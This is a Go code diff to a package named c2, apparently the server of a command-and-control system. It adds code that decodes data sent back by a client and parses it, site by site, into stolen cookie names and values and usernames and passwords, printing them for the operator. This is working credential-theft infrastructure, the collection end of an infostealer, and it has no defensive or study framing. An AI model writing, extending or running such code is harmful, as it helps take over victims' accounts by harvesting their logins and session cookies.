@@ -3,6 +3,8 @@ package c2
 import (
 	"bufio"
 	"encoding/base64"
+	"encoding/json"
+	"fmt"
 	"log"
 	"net"
 	"os"
@@ -112,6 +114,77 @@ func processData(args string, writer *bufio.Writer) {
 		return
 	}
 
-	log.Printf("\n\n*****************\nProcessed data:\n%v\n", string(decoded))
-	sendResponse(writer, "OK Data processed successfully")
+	// search for first instance of {" indicating start of json object in input string from client
+	dataString := string(decoded)
+	jsonStartingIndex := strings.Index(dataString, "{\"")
+	if jsonStartingIndex == -1 {
+		sendResponse(writer, "BAD Error in finding json substring, probably empty.")
+		return
+	}
+
+	// process the JSON in an easy to use format for the c2 operator
+	jsonString := dataString[jsonStartingIndex:]
+	var jsonObject map[string]interface{}
+
+	err = json.Unmarshal([]byte(jsonString), &jsonObject)
+	if err != nil {
+		fmt.Println("BAD Error in parsing JSON ", err)
+		sendResponse(writer, "BAD Error in parsing JSON")
+		return
+	}
+
+	// now we have the key:value pairs, split the substrings based on ; and ||| delimiters
+
+	for site, value := range jsonObject {
+
+		// fmt.Printf("Raw data for %v, data: %v\n", site, value)
+
+		valueStr, ok := value.(string)
+		if !ok {
+			log.Printf("Error - Value for key %v is not a string, skipping. Value is: %v\n", site, value)
+			continue
+		}
+
+		// split the substrings by ";"
+		substrings := strings.Split(valueStr, ";")
+
+		for _, substring := range substrings {
+
+			// trim whitespace to help out with less errors in the below parsing
+			// helps to prevent splitting when we have no more ||| to split on
+			trimmedSubstring := strings.TrimSpace(substring)
+			if trimmedSubstring == "" {
+				continue
+			}
+
+			// now split on ||| to pull out cookie name / username ||| value / password
+			parts := strings.Split(substring, "|||")
+
+			// handle errors
+			if len(parts) == 0 || len(parts) == 1 && parts[0] == "" {
+				continue
+			} else if len(parts) != 2 {
+				log.Printf("Invalid format: expected 2 parts but found %d in substring '%s', parts: %v\n", len(parts), substring, parts)
+				continue
+			}
+
+			// print left and right part
+			fmt.Printf("Site: %s, Cookie name / username: %s, Cookie value / password: %s\n", site, parts[0], parts[1])
+		}
+
+		// console formatting
+		fmt.Println()
+
+	}
+
+	fmt.Println()
+	fmt.Println()
+	fmt.Println("Summary of sites data extracted for:")
+
+	for key := range jsonObject {
+		fmt.Println(key)
+	}
+
+	// log.Printf("\n\n*****************\nProcessed data:\n%v\n", string(decoded))
+	sendResponse(writer, "OK Data processed")
 }
